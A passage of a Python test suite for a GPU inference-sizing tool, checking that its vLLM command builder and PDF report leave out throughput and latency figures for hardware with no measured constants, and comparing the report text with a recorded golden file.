                 ("30B MoE", "qwen3-30b"), ("26B SWA", "gemma4-26b"), ("671B MLA", "dsr1-671b")]
PROBE_PRECISIONS = [("bf16", {"bpp": 2}), ("fp8", {"bpp": 1, "quant": "fp8"}),
                    ("awq", {"bpp": 0.5, "quant": "awq"}),
                    # Both of the other quantisations the tool offers. GGUF is a
                    # branch the command builder already takes, so it is a branch
                    # a leak can ride.
                    ("gptq", {"bpp": 0.5, "quant": "gptq"}),
                    ("gguf Q4_K_M", {"bpp": 0.63, "quant": "gguf"})]
PROBE_LOADS = [
    ("16 at 8K", {"ctx": 8192, "conc": 16}),
    ("256 at 1K", {"ctx": 1024, "conc": 256}),
    ("4 at 32K behind an 8K prefix",
     {"ctx": 32768, "conc": 4, "shared_prefix": 8192, "prefix_caching": True}),
    # A prefix configured and the caching switched off, which the grid never
    # took: every load that named a prefix also enabled caching for it.
    ("4 at 32K, 8K prefix, caching off",
     {"ctx": 32768, "conc": 4, "shared_prefix": 8192, "prefix_caching": False}),
]
# More than one key with no PERF entry, because a leak can be gated on the key
# itself rather than on its absence. Every key a catalog row names that PERF has
# no entry for — the AMD architectures — derived rather than typed, plus a
# placeholder no row will ever name.
PROBE_UNKNOWN_KEYS = ["no-such-key"] + sorted({g["perfKey"] for g in gr.GPUS.values()
                                                if g["perfKey"] not in gr.PERF})
assert len(PROBE_UNKNOWN_KEYS) >= 2, "no catalog row names a key PERF lacks, so only the placeholder is probed"
CATALOG_NAMES = {g["name"] for g in gr.GPUS.values()}


def absent_pairs():
    """(label, cfg with constants, the same cfg without), over the axes above:
    one device and two per board, one board to past an NVLink domain and past a
    data-parallel split, dense / MoE / SWA / MLA, three weight precisions, both
    KV dtypes, both interconnects, three loads including a shared prefix and a
    saturated short context on the compute ceiling, cards with and without FP8
    tensor cores, and a model the preset named against one it did not."""
    pairs = []
    i = 0
    for card_name, card in PROBE_CARDS:
        # Counts that are not powers of two, that sit on an NVLink domain
        # boundary, and that sit past one with an uneven split.
        for boards in (1, 2, 3, 5, 8, 12, 16):
            model_name, preset = PROBE_PRESETS[i % len(PROBE_PRESETS)]
            prec_name, prec = PROBE_PRECISIONS[(i // 2) % len(PROBE_PRECISIONS)]
            load_name, load = PROBE_LOADS[(i // 4) % len(PROBE_LOADS)]
            kv_bpp = 1 if i % 2 else 2
            nvlink = i % 3 != 0
            named = i % 4 == 1
            # The report's other naming path: a model imported by HuggingFace id
            # rather than chosen from the presets. Exclusive with `named`.
            imported = i % 4 == 3
            # Decorrelated from the KV dtype, so "this key" and "FP8 KV" are not
            # the same probe.
            unknown_key = PROBE_UNKNOWN_KEYS[(i // 8) % len(PROBE_UNKNOWN_KEYS)]
            unknown_card = dict(card, perfKey=unknown_key)
            base = dict(gr.arch_fields(gr.PRESETS[preset]), bpp=2, ctx=8192, conc=16,
                        n_gpu=boards, nvlink=nvlink, kv_bpp=kv_bpp,
                        # Both come from a preset or from the raw defaults every
                        # builder falls back to; a hand-built cfg with neither is
                        # not a state the tool can reach.
                        hf_model=gr.PRESETS[preset]["hf"] if named
                        else "org/imported-27b" if imported else "/opt/models/YourModel",
                        model_name=gr.PRESETS[preset]["name"] if named
                        else "org/imported-27b" if imported
                        else f"{gr.arch_fields(gr.PRESETS[preset])['params']}B model")
            base.update(prec)
            base.update(load)
            pairs.append((
                f"{card_name} x{boards}, {model_name}, {prec_name}, {load_name}, "
                f"KV {'FP8' if kv_bpp < 2 else 'BF16'}, {'NVLink' if nvlink else 'PCIe'}"
                f"{', preset named' if named else ''}{', model imported' if imported else ''}"
                f', unknown key "{unknown_key}"',
                dict(base, gpu=card, vendor=card["vendor"], perfKey=card["perfKey"]),
                dict(base, gpu=unknown_card, vendor=unknown_card["vendor"],
                     perfKey=unknown_card["perfKey"])))
            i += 1
    return pairs


def check_without_constants_only_the_figures_that_need_them_go():
    over = bound = False
    # Every axis the grid claims to cover, counted while it runs. A grid that
    # quietly stops rendering single-device boards, or FP8 KV, or MLA, says
    # nothing about those shapes, and the tests below would still be green — so
    # the claim is checked rather than written in a docstring.
    axes = {"a single-device board": 0, "two devices on one board": 0, "one board": 0,
            "a board count that is not a power of two": 0, "a full NVLink domain": 0,
            "past an NVLink domain": 0, "a data-parallel split": 0, "FP8 KV cache": 0,
            "BF16 KV cache": 0, "NVLink": 0, "PCIe": 0, "sliding-window attention": 0,
            "MLA": 0, "a mixture of experts": 0, "FP8 on silicon without FP8 cores": 0,
            "a model the preset named": 0, "a model imported by id": 0,
            "a model neither named nor imported": 0, "a shared prefix with caching on": 0,
            "a shared prefix with caching off": 0, "a vendor that is not nvidia": 0,
            "a card name unlike the catalog's": 0, "the placeholder unknown key": 0,
            "an unknown key that is not the placeholder": 0, "GGUF weights": 0,
            "GPTQ weights": 0, "AWQ weights": 0, "FP8 weights": 0, "unquantised weights": 0}
    for label, kcfg, ucfg in absent_pairs():
        known, unknown = gr.compute(kcfg), gr.compute(ucfg)
        devices = kcfg["gpu"].get("devices", 1) or 1
        axes["a single-device board"] += devices == 1
        axes["two devices on one board"] += devices > 1
        axes["one board"] += kcfg["n_gpu"] == 1
        axes["a board count that is not a power of two"] += kcfg["n_gpu"] not in (1, 2, 4, 8, 16)
        axes["a full NVLink domain"] += gr.device_count_for(kcfg) == 8
        axes["past an NVLink domain"] += gr.device_count_for(kcfg) > 8
        axes["a data-parallel split"] += known["dp"] > 1
        axes["FP8 KV cache"] += kcfg.get("kv_bpp", 2) < 2
        axes["BF16 KV cache"] += kcfg.get("kv_bpp", 2) == 2
        axes["NVLink"] += bool(kcfg.get("nvlink"))
        axes["PCIe"] += not kcfg.get("nvlink")
        axes["sliding-window attention"] += kcfg.get("attn") == "swa"
        axes["MLA"] += kcfg.get("attn") == "mla"
        axes["a mixture of experts"] += known["is_moe"]
        axes["FP8 on silicon without FP8 cores"] += bool(known.get("fp8_no_tensor_cores"))
        imported = kcfg["model_name"] == kcfg["hf_model"]
        named = not imported and kcfg["model_name"] != f"{kcfg['params']}B model"
        axes["a model the preset named"] += named
        axes["a model imported by id"] += imported
        axes["a model neither named nor imported"] += not named and not imported
        axes["a shared prefix with caching on"] += bool(kcfg.get("shared_prefix")) and bool(
            kcfg.get("prefix_caching"))
        axes["a shared prefix with caching off"] += bool(kcfg.get("shared_prefix")) and not bool(
            kcfg.get("prefix_caching"))
        axes["a vendor that is not nvidia"] += kcfg["gpu"]["vendor"] != "nvidia"
        axes["a card name unlike the catalog's"] += kcfg["gpu"]["name"] not in CATALOG_NAMES
        axes["the placeholder unknown key"] += ucfg["perfKey"] == "no-such-key"
        axes["an unknown key that is not the placeholder"] += ucfg["perfKey"] != "no-such-key"
        for q in ("gguf", "gptq", "awq", "fp8"):
            axes[f"{q.upper()} weights"] += kcfg.get("quant") == q
        axes["unquantised weights"] += not kcfg.get("quant")
        assert known["throughput_modelled"] is True, f"{label}: the card with constants is not modelled"
        assert unknown["throughput_modelled"] is False, f"{label}: a perfKey with no entry is modelled"
        assert set(known) == set(unknown), f"{label}: the two results carry different fields"
        suppressed = set(known) - SURVIVE_WITHOUT_CONSTANTS - {"throughput_modelled"}
        assert NAMED_SUPPRESSED <= suppressed, (
            f"listed as surviving, though the ruling suppresses them: {sorted(NAMED_SUPPRESSED - suppressed)}")
        for k in sorted(suppressed):
            # None exactly: 0 prints as "0 tokens/sec".
            assert unknown[k] is None, f"{label}: {k} is {unknown[k]!r} with no constants — it has to be None"
            assert known[k] is not None, f"{label}: {k} is None even with constants"
        for k in sorted(SURVIVE_WITHOUT_CONSTANTS):
            assert k in known, f"{k} is listed as surviving, but compute() returns no such field"
            assert unknown[k] == known[k] and type(unknown[k]) is type(known[k]), (
                f"{label}: {k} moved when the constants went: {known[k]!r} -> {unknown[k]!r}")
        assert gr.build_vllm_cmd(ucfg, unknown) == gr.build_vllm_cmd(kcfg, known), (
            f"{label}: the vLLM command depends on the constants")
        if not known["fits"]:
            over = True
            assert gr.boards_needed(ucfg, unknown) == gr.boards_needed(kcfg, known), (
                f"{label}: the board count depends on the constants")
            assert gr.boards_advice(ucfg, unknown) == gr.boards_advice(kcfg, known), (
                f"{label}: the advice depends on the constants")
        # compute() exports no compute-bound flag; a ceiling that holds the
        # saturated figure is one that more bandwidth does not move.
        faster = gr.compute(dict(kcfg, gpu=dict(kcfg["gpu"], bw=kcfg["gpu"]["bw"] * 10)))
        bound = bound or faster["sat_tok"] == known["sat_tok"]
    assert over, "every probe fits, so the board recommendation was never compared"
    assert bound, "no probe sits on the compute ceiling, so the decode MFU path was never suppressed"
    missing = sorted(k for k, n in axes.items() if not n)
    assert not missing, f"the probe grid no longer renders: {', '.join(missing)}"

test("with no constants, every figure that needs one is None and nothing else moves, command included",
     check_without_constants_only_the_figures_that_need_them_go)


def check_a_perf_key_with_no_entry_never_gets_nvidias_constants():
    cfg = gr.from_cli_args(cli_args_for("llama31-8b"))
    nvidia = gr.compute(cfg)
    assert nvidia["throughput_modelled"] is True, "the H100 probe must be modelled"
    # A typo, a case slip, a vendor name, dict-method names, and non-strings —
    # unhashable ones included, which a bare PERF.get() would raise on.
    for key in ("Nvidia", "NVIDIA", "nvidia ", " nvidia", "nvida", "amd", "cdna3", "",
                "constructor", "__proto__", "toString", "get", "keys",
                None, 0, 42, True, ["nvidia"], ("nvidia",), {"nvidia": 1}):
        try:
            got = gr.compute(dict(cfg, perfKey=key))
        except Exception as e:
            raise AssertionError(f"perfKey {key!r} raised {type(e).__name__}: {e}")
        assert got["throughput_modelled"] is False, f"perfKey {key!r} was treated as having constants"
        assert got["single_tok"] != nvidia["single_tok"], f"perfKey {key!r} was given NVIDIA's single_tok"
        for k in ("single_tok", "agg_tok", "ttft_ms", "perf_mbu", "perf_mfu_decode"):
            assert got[k] is None, f"perfKey {key!r}: {k} is {got[k]!r}"
    keyless = {k: v for k, v in cfg.items() if k != "perfKey"}
    assert gr.compute(keyless)["throughput_modelled"] is False, "a cfg with no perfKey was given constants"
    # The lookup reads perfKey, not vendor — the field it used to read.
    assert gr.compute(dict(cfg, vendor="nvidia", perfKey="no-such-key"))["throughput_modelled"] is False, (
        'vendor "nvidia" granted constants to a key with none')
    other = gr.compute(dict(cfg, vendor="acme", perfKey="nvidia"))
    assert other["throughput_modelled"] is True, 'vendor "acme" removed constants its perfKey has'
    assert other["single_tok"] == nvidia["single_tok"] and other["perf_mbu"] == gr.PERF["nvidia"]["mbu"]

test("a perfKey with no PERF entry gets no constants — never NVIDIA's, and never an exception",
     check_a_perf_key_with_no_entry_never_gets_nvidias_constants)


# A throughput or TTFT figure, however its unit is spelled: "tok/s", "t/s",
# "tokens/sec", "tokens per second", "per sec", "ms", "milliseconds" — the same
# pattern the page is read with in tests/model.test.js. The checks below do not
# lean on it alone: a figure under a unit nobody listed still prints a number and
# still shows text the report with constants does not, and both are checked on
# their own.
FIGURE = re.compile(r"\bt(?:ok(?:en)?s?)?\s*(?:/|per)\s*s(?:ec(?:ond)?s?)?\b|\bper\s+sec(?:ond)?s?\b"
                    r"|\btps\b|\d\s*ms\b|\bmilli-?seconds?\b", re.I)
NUMBER = re.compile(r"\d+(?:[.,]\d+)*")


def in_order_within(few, many):
    """Whether every item of `few` occurs in `many`, in the same order."""
    it = iter(many)
    return all(any(x == y for y in it) for x in few)


# What a reader takes in: reportlab's inline markup stripped, entities decoded,
# whitespace collapsed, the generation timestamp normalised so two renders a
# minute apart still compare, and the card's own name taken out — a name is the
# one place in a reason where a digit belongs. Attribute values are read rather
# than stripped with their tag: a link or a title is text a reader can reach.
TIMESTAMP = re.compile(r"Generated \w+ \d+, \d{4} at \d{2}:\d{2}")
ATTRIBUTE = re.compile(r'\s(?:href|title|alt)="([^"]*)"')


def texts_of(raw, name):
    t = TIMESTAMP.sub("Generated <ts>", str(raw))
    attrs = ATTRIBUTE.findall(t)
    t = re.sub(r"<[^>]*>", " ", t)
    for entity, ch in (("&nbsp;", " "), ("&lt;", "<"), ("&gt;", ">"), ("&amp;", "&")):
        t = t.replace(entity, ch)

    def flat(x):
        return re.sub(r"\s+", " ", x.replace(name, " ")).strip()

    return ([x for x in re.split(r"(?<=[.!?])\s+", flat(t)) if x]
            + [x for x in map(flat, attrs) if x])


def words_of(text):
    return re.findall(r"[a-z0-9]+", text.lower())


def with_moved_figures(c):
    """The same result with every figure that needs a constant moved — numbers
    scaled and offset, flags flipped — and everything the ruling lets survive
    untouched. A string that reads differently under it is a string that carries
    one of those figures, so no unit has to be recognised to find one."""
    return {k: (v if k == "throughput_modelled" or k in SURVIVE_WITHOUT_CONSTANTS
                else (not v) if isinstance(v, bool)
                else (v * 3 + 7) if isinstance(v, (int, float)) else v)
            for k, v in c.items()}


_ABSENT_VIEWS = []


def absent_views():
    """Rendered once and shared by the checks below: the report with constants,
    the same report with every figure that needs one moved, and the report
    without. (label, cfg with, cfg without, strings, moved strings, strings
    without.)"""
    if not _ABSENT_VIEWS:
        for label, kcfg, ucfg in absent_pairs():
            _ABSENT_VIEWS.append((label, kcfg, ucfg, story_strings(kcfg),
                                  story_strings(kcfg, with_moved_figures(gr.compute(kcfg))),
                                  story_strings(ucfg)))
    return _ABSENT_VIEWS


# The only text a report with no constants may show that the report with them
# does not: the reason, as the document words it, with the card's own name taken
# out. Reword one of these and this list moves with it — which is what makes the
# wording a contract rather than whatever generate() happens to say that day.
REASON = [
    # the section head, which is "Throughput estimate" when there is one
    "Throughput",
    # the throughput table, where the five figures and the Basis row were
    "Throughput and TTFT",
    "Not modelled",
    # the paragraph under it, sentence by sentence
    "No measured utilisation is published for : there are no memory-bandwidth or compute "
    "utilisation figures for this hardware.",
    "Estimating its throughput or time to first token would mean borrowing another "
    "architecture's constants, which do not transfer, so this report gives neither.",
    "The VRAM, fit, cost and command figures do not depend on them.",
    # the interconnect note, where the PCIe decode loss was
    "PCIe provides 64-128 GB/s.",
]

# The only sentence a report with no constants may show that is neither in the
# list above nor shown verbatim with them: a speed sentence with its speed clause
# taken off, exactly as generate() writes it. A literal, not "any subsequence of
# the words" — a subsequence can keep the number and drop only the words the
# speech patterns key on, which says more rather than less. It is still checked
# to be a shortening of a sentence that really stood in that report.
SHORTENED = [
    "Above one NVLink domain both the split and the interconnect factor priced against it are "
    "heuristics; nothing here is measured above 2 devices.",
    # The same sentence on an OAM board, whose domain is its Infinity Fabric.
    "Above one Infinity Fabric domain both the split and the interconnect factor priced against it "
    "are heuristics; nothing here is measured above 2 devices.",
]


def check_the_report_says_why_where_the_figures_were():
    """The PDF is the document that gets forwarded. Discovered like the page's
    surfaces: the strings that carry a throughput or TTFT figure for the card
    with constants must all be gone for the card without, and the reason must
    stand in the throughput section, once. Every sentence that talks about those
    figures, or about speed, goes with them. Everything before the section, and
    the cost and the command after it, reads exactly as it does with constants."""
    figure = FIGURE
    why = (re.compile(r"no measured utilisation", re.I), re.compile(r"do not\s+transfer", re.I))
    speech = {
        "single-stream": re.compile(r"single-stream", re.I),
        "aggregate ceiling": re.compile(r"aggregate ceiling", re.I),
        "decode throughput": re.compile(r"decode throughput", re.I),
        "the throughput and TTFT figures": re.compile(r"throughput and TTFT figures"),
        "bandwidth-bound estimate": re.compile(r"bandwidth-bound estimate"),
        "FP8 tensor cores": re.compile(r"FP8 tensor cores"),
        "the Basis row": re.compile(r"^Basis$"),
    }
    ts = re.compile(r"Generated \w+ \d+, \d{4} at \d{2}:\d{2}")
    heard = set()
    kept = 0

    def split(strings):
        head = next(i for i, t in enumerate(strings) if t in ("Throughput estimate", "Throughput"))
        cost, notes = strings.index("Cost estimate"), strings.index("Notes and assumptions")
        return ([ts.sub("Generated <ts>", t) for t in strings[:head]],
                strings[head:cost], strings[cost:notes], strings[notes:])

    accounted = 0
    shortened = set()
    for label, kcfg, ucfg, known, moved, unknown in absent_views():
        assert any(figure.search(t) for t in known), (
            f"{label}: the report with constants prints no figure, so this sees nothing")
        leaked = [t for t in unknown if figure.search(t)]
        assert not leaked, f"{label}: the report without constants prints {leaked[:3]!r}"
        k_head, k_tp, k_cost, _ = split(known)
        u_head, u_tp, u_cost, _ = split(unknown)
        reasons = [t for t in unknown if all(r.search(t) for r in why)]
        assert len(reasons) == 1 and reasons[0] in u_tp, (
            f"{label}: the reason should appear once, in the throughput section; found {reasons!r}")
        assert "Not modelled" in u_tp, f"{label}: the throughput table does not say 'Not modelled': {u_tp!r}"
        # The batch row is KV arithmetic and stands in both.
        row = "Max batch at this context"
        assert row in u_tp and u_tp[u_tp.index(row) + 1] == k_tp[k_tp.index(row) + 1], (
            f"{label}: the max-batch row did not survive unchanged")
        assert u_head == k_head, f"{label}: the report before the throughput section depends on the constants"
        assert u_cost == k_cost, f"{label}: the cost section or the command depends on the constants"
        # No number in the throughput section but the max-batch row's, once the
        # card's own name is out: a figure cannot come back under any unit, in a
        # row of its own or inside the reason.
        name = ucfg["gpu"]["name"]
        value = u_tp[u_tp.index(row) + 1]
        rest = [t for t in u_tp if t not in (row, value)]
        shown = [n for t in rest for n in NUMBER.findall(t.replace(name, " "))]
        assert not shown, (
            f"{label}: the throughput section shows {shown} for a card without constants: {rest!r}")
        # The notes keep every sentence that is not about speed, word for word and
        # in order, and show only numbers they showed with constants, in the same
        # order — the rule the page is held to in tests/model.test.js.
        k_notes, u_notes = split(known)[3], split(unknown)[3]

        def sentences(strings):
            return [x for t in strings for x in re.split(r"(?<=[.!?])\s+", t.replace(name, " ")) if x]

        before, after = sentences(k_notes), " ".join(sentences(u_notes))
        at = 0
        for sentence in before:
            if any(rx.search(sentence) for rx in speech.values()):
                continue
            found = after.find(sentence, at)
            assert found >= 0, f"{label}: the notes lost {sentence!r} when the constants went"
            at = found + len(sentence)
            kept += 1
        numbers, may = NUMBER.findall(after), NUMBER.findall(" ".join(before))
        assert in_order_within(numbers, may), (
            f"{label}: the notes show numbers without constants they did not show with them: "
            f"{numbers} against {may}")
        # Nothing new, the reverse of the rule above and the one that does not
        # depend on recognising a unit. Every sentence the report without
        # constants shows — in a table cell, a paragraph, a bullet, the footer,
        # or anything printed while the document was built — must be a sentence
        # the report with constants shows outside the strings that carry a
        # figure, a shortening of one of its speed sentences, or one of the
        # reason strings above. A figure under a unit nobody listed, a number
        # spelled as a word and a claim about speed with no number in it are all
        # the same failure here: text that was not there before.
        assert len(moved) == len(known), (
            f"{label}: moving the throughput figures changed how the report is laid out")
        still = [known[i] for i in range(len(known))
                 if known[i] == moved[i] and not figure.search(known[i])]
        outside, spoken = set(), []
        for raw in still:
            for t in texts_of(raw, name):
                outside.add(t)
                if any(rx.search(t) for rx in speech.values()):
                    spoken.append(t)
        for raw in unknown:
            for t in texts_of(raw, name):
                accounted += 1
                is_shortening = t in SHORTENED and any(
                    in_order_within(words_of(t), words_of(said)) for said in spoken)
                if is_shortening:
                    shortened.add(t)
                assert t in outside or t in REASON or is_shortening, (
                    f"{label}: the report without constants shows text the report with them does not "
                    f"show outside its figures, and that is neither a reason string nor a listed "
                    f"shortening: {t!r}")
        for heard_name, rx in speech.items():
            heard.update([heard_name] if any(rx.search(t) for t in known) else [])
            said = [t for t in unknown if rx.search(t)]
            assert not said, (
                f"{label}: without constants the report still mentions {heard_name}: {said[0][:160]!r}")
    # Every pattern has to have matched a report with constants, or it guards nothing.
    assert heard == set(speech), f"never seen with constants, so not guarding: {sorted(set(speech) - heard)}"
    assert kept > 50, f"only {kept} note sentences were checked for survival"
    assert sorted(shortened) == sorted(SHORTENED), (
        "a listed shortening is never emitted where the sentence it shortens stood, so it "
        f"excuses nothing: {sorted(set(SHORTENED) - shortened)}")
    assert accounted > 1000, f"only {accounted} texts were accounted for"

test("the report prints no throughput figure without constants, and says why in its place",
     check_the_report_says_why_where_the_figures_were)


def check_the_report_prints_no_none_without_constants():
    bad = re.compile(r"\bNone\b|\bnan\b|\bNaN\b|\binf\b|N/A|" + FIGURE.pattern, re.I)
    for sample in ("~None ms", "nan tokens/sec", "~0 tokens/sec", "N/A", "inf", "~0 ms",
                   "~0 tokens per second", "~0 milliseconds", "~0 t/s", "0 tps",
                   "Expect roughly 0 tokens per second per user."):
        assert bad.search(sample), f"the pattern cannot see {sample!r}"
    chars = known_hits = 0
    for label, kcfg, ucfg, known, moved, unknown in absent_views():
        for t in unknown:
            m = bad.search(t)
            assert not m, f"{label}: the report without constants prints {m.group(0)!r} in {t[:160]!r}"
            chars += len(t)
        known_hits += sum(bool(bad.search(t)) for t in known)
    assert known_hits and chars > 20000, (
        f"not discriminating: {known_hits} strings matched with constants, {chars} characters scanned")

test("the report prints no None, nan or throughput figure for a card without constants",
     check_the_report_prints_no_none_without_constants)


def check_a_card_without_constants_gets_a_real_pdf():
    """Through a real cfg builder and a real reportlab build, not the story spy:
    the layout has to hold the replacement rows."""
    key = "__no_constants_probe"
    gr.GPUS[key] = dict(gr.GPUS["h100-80"], name="Unmeasured 80 GB", vendor="acme",
                        perfKey="acme-unmeasured")
    fd, out = tempfile.mkstemp(suffix=".pdf")
    os.close(fd)
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            cfg = gr.from_cli_args(dict_args(cli_args_for("llama31-8b"), gpu=key, ngpu=2))
        assert gr.compute(cfg)["throughput_modelled"] is False, "the probe card was given constants"
        gr.ReportCard(cfg, output_path=out).generate()
        with open(out, "rb") as f:
            head = f.read(5)
        assert head == b"%PDF-" and os.path.getsize(out) > 1000, (
            f"no PDF was written: {head!r}, {os.path.getsize(out)} bytes")
    finally:
        del gr.GPUS[key]
        os.remove(out)

test("a card without constants goes through the CLI builder to a real PDF",
     check_a_card_without_constants_gets_a_real_pdf)


# ---- what today's cards put in the PDF -------------------------------------
# The same hole tests/model.test.js closes for the page, on this side. Every
# display check above is differential: the report with constants against the
# same report without, held to the throughput figures. It catches a sentence
# added to one of them and is blind to a sentence added to both — a note
# appended for every card in the catalog reads identically on both sides, so
# the comparison has nothing to notice.
#
# That is not hypothetical here: appending one line to the notes, for every
# card, unconditionally, passes the whole suite.
#
# So this records what generate() actually emits today. story_strings() is the
# spy the absent-constants checks use — the story, KeepTogether's children,
# bullets, table cells, drawings, the header and footer callbacks, the document
# metadata, and anything printed to either stream while the document was built.
# If a reader can end up seeing it, it is in here.
#
# Deliberate change?  UPDATE_GOLDEN=1 python3 tests/report.test.py
# then read the diff before committing it.
print("\nWhat today's cards put in the PDF")

GOLDEN_REPORT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "golden", "report.json")

# Two clocks run through the document: the cover's "Generated <date> at <time>"
# and the footer's own date. Both change with the day, so both are replaced —
# and the replacement keeps the shape, so a document that stops dating itself
# still fails.
#
# The footer's used to be matched as today's literal date value (\b<today>\b)
# rather than by where it sits — which caught the footer, but a \b word
# boundary is satisfied just as well by a date sitting inside a longer
# sentence, and a recorded price carries the date it was read
# (fix/cost-provenance) *as* a sentence: "...read 2026-09-22. Specialized...".
# The day this ran was also the day every price on the catalog was read, so
# every one of those embedded dates got blanked into the golden too — and
# every day after, today's clock no longer equals that recorded date, so the
# blanking stops firing and the golden and a fresh run permanently disagree.
# \A...\Z instead of \b...\b: the footer's date is drawn as nothing but that
# date (see the drawRightString call it comes from), so it is the *entire*
# captured string, never a fragment of a longer one — the one shape a
# recorded, sentence-embedded date can never take. That is what makes this
# "by context", not by value: it keys on the string's shape, not on whether
# its value happens to match today.
#
# Both placeholders use [brackets], not <angle brackets>: reader_view() strips
# anything matching <[^>]*> as reportlab markup (<b>, <br/>, ...), so an
# angle-bracket placeholder inserted *before* reader_view() runs is stripped
# right back out — "Generated <date> at <time>" golden as "Generated  at ",
# both clocks scrubbed to invisible rather than to a readable placeholder.
def golden_clocks():
    today = datetime.now().strftime("%Y-%m-%d")
    return (
        (re.compile(r"Generated \w+ \d+, \d{4} at \d{2}:\d{2}"), "Generated [date] at [time]"),
        (re.compile(r"\A" + re.escape(today) + r"\Z"), "[today]"),
    )


def golden_cases():
    """Every catalog row at one canonical load, then the axes that change what
    the report says rather than what it computes, then the same without
    constants — mirroring tests/model.test.js's cases so a change that shows up
    on one side can be looked for on the other."""
    dense8b = dict(gr.arch_fields(gr.PRESETS["llama31-8b"]))
    seventy = dict(gr.arch_fields(gr.PRESETS["llama31-70b"]))

    def cfg(card, boards, arch=None, **over):
        base = dict(arch or dense8b, bpp=2, ctx=8192, conc=16, n_gpu=boards, gpu=card,
                    nvlink=True, kv_bpp=2, vendor=card["vendor"], perfKey=card["perfKey"],
                    hf_model=None, model_name=None, preset="llama31-8b")
        base.update(over)
        return base

    # NVLink as every builder sets it: asked for, and granted only to a board
    # that has it (nvlink_for). Left on for every card, the MI250X — two devices
    # on one board with no NVLink — recorded a report the tool cannot produce.
    cases = [(f"{slug} — 8B bf16, 16 at 8K", cfg(gr.GPUS[slug], 1, nvlink=gr.supports_nvlink(gr.GPUS[slug])))
             for slug in sorted(gr.GPUS)]
    h, t4 = gr.GPUS["h100-80"], gr.GPUS["t4-16"]
    keyless_h, keyless_t4 = dict(h, perfKey="no-such-key"), dict(t4, perfKey="no-such-key")
    cases += [
        ("h100-80 x8 NVLink — 70B bf16", cfg(h, 8, seventy, preset="llama31-70b")),
        ("h100-80 x8 PCIe — 70B bf16, the fabric note",
         cfg(h, 8, seventy, preset="llama31-70b", nvlink=False)),
        ("h100-80 x16 PCIe — past one NVLink domain, so the heuristic caveat",
         cfg(h, 16, seventy, preset="llama31-70b", nvlink=False)),
        ("h100-80 x1 — 70B bf16 does not fit, so the verdict and the board advice",
         cfg(h, 1, seventy, preset="llama31-70b")),
        ("h100-80 x1 — fp8 weights on silicon that has the tensor cores",
         cfg(h, 1, bpp=1, quant="fp8")),
        ("t4-16 x1 — fp8 weights on silicon that does not, so the caveat",
         cfg(t4, 1, bpp=1, quant="fp8", nvlink=False)),
        ("h100-80 x1 — 256 at 1K, so the KV queue warning", cfg(h, 1, ctx=1024, conc=256)),
        ("h100-80 x1 — a model imported by id rather than named by a preset",
         cfg(h, 1, hf_model="org/imported-8b", model_name="imported-8b", preset=None)),
        # No catalog row is keyless until the AMD rows land. What the report says
        # in place of a figure is as much "what it emits" as the figure was, and
        # the comparisons cannot pin it — it is the thing they are comparing.
        ("(no constants) h100-80 x1 — 8B bf16, the reason in place of the figures",
         cfg(keyless_h, 1)),
        ("(no constants) h100-80 x8 PCIe — 70B bf16, past one domain",
         cfg(keyless_h, 8, seventy, preset="llama31-70b", nvlink=False)),
        ("(no constants) t4-16 x1 — fp8 on silicon without the tensor cores",
         cfg(keyless_t4, 1, bpp=1, quant="fp8", nvlink=False)),
    ]
    return cases


GOLDEN_ATTR = re.compile(r'\s([a-zA-Z][\w-]*)="([^"]*)"')
GOLDEN_TAG = re.compile(r"<[^>]*>")


def reader_view(raw):
    """What a reader takes off a string, rather than the markup carrying it.

    The same rule tests/model.test.js applies to the page, for the same reason:
    reportlab's own markup (<b>, <font>, <br/>) is not shown to anyone, and
    charging a full golden update for touching it teaches people to regenerate
    without reading the diff — the one way this test can fail silently.

    Attribute values are kept and sorted, because a figure with no text hides in
    one; `class` is dropped, because no reader sees a class name."""
    text = str(raw)
    attrs = sorted(f"{name}={value}" for name, value in GOLDEN_ATTR.findall(text)
                   if name.lower() != "class")
    body = GOLDEN_TAG.sub(" ", text)
    for entity, ch in (("&nbsp;", " "), ("&lt;", "<"), ("&gt;", ">"), ("&amp;", "&")):
        body = body.replace(entity, ch)
    body = re.sub(r"\s+", " ", body).strip()
    return {"text": body, "attrs": attrs} if attrs else body


def capture_golden():
    out = {}
    for label, cfg in golden_cases():
        strings = story_strings(cfg)
        for rx, placeholder in golden_clocks():
            strings = [rx.sub(placeholder, s) for s in strings]
        out[label] = [reader_view(s) for s in strings]
    return out


def check_the_report_still_says_what_the_golden_records():
    now = capture_golden()
    if os.environ.get("UPDATE_GOLDEN"):
        os.makedirs(os.path.dirname(GOLDEN_REPORT), exist_ok=True)
        with open(GOLDEN_REPORT, "w", encoding="utf-8") as fh:
            json.dump(now, fh, indent=1, ensure_ascii=False, sort_keys=True)
            fh.write("\n")
        print(f"       (rewrote {GOLDEN_REPORT} — read the diff)")
        return
    assert os.path.exists(GOLDEN_REPORT), (
        f"{GOLDEN_REPORT} is missing — UPDATE_GOLDEN=1 python3 tests/report.test.py writes it")
    with open(GOLDEN_REPORT, encoding="utf-8") as fh:
        golden = json.load(fh)

    # What moved, not that something did: a golden whose failure says only "not
    # equal" is a golden nobody updates honestly.
    moved = []
    for label in sorted(set(golden) | set(now)):
        was, has = golden.get(label), now.get(label)
        if was == has:
            continue
        if was is None or has is None:
            moved.append((label, "(case absent)" if was is None else "(case removed)", ""))
            continue
        for i in range(max(len(was), len(has))):
            a = was[i] if i < len(was) else None
            b = has[i] if i < len(has) else None
            if a != b:
                moved.append((f"{label} / string {i}",
                              "(absent)" if a is None else a, "(absent)" if b is None else b))
    if not moved:
        return
    shown = "\n".join(f"  {at}\n    was: {str(a)[:220]!r}\n    now: {str(b)[:220]!r}"
                      for at, a, b in moved[:6])
    raise AssertionError(
        f"{len(moved)} recorded string(s) changed. If every one of these was meant, "
        f"UPDATE_GOLDEN=1 python3 tests/report.test.py and commit the diff.\n{shown}"
        + (f"\n  ... and {len(moved) - 6} more" if len(moved) > 6 else ""))


def check_the_golden_records_the_shapes_that_matter():
    """The case list is a literal, and every literal in this file that decides
    coverage is checked against what the tool ships. Derived from the cases, so
    a case dropped from the list fails here rather than silently narrowing the
    golden the next time someone regenerates it."""
    cases = golden_cases()
    cfgs = [cfg for _, cfg in cases]
    named = [label for label, _ in cases]
    missing = [slug for slug in gr.GPUS if not any(n.startswith(slug + " ") for n in named)]
    assert not missing, f"the golden stopped recording catalog rows: {missing}"
    # Every case is a report the tool can produce: NVLink only on a board that has it.
    unreachable = [label for label, c in cases if c.get("nvlink") and not gr.supports_nvlink(c["gpu"])]
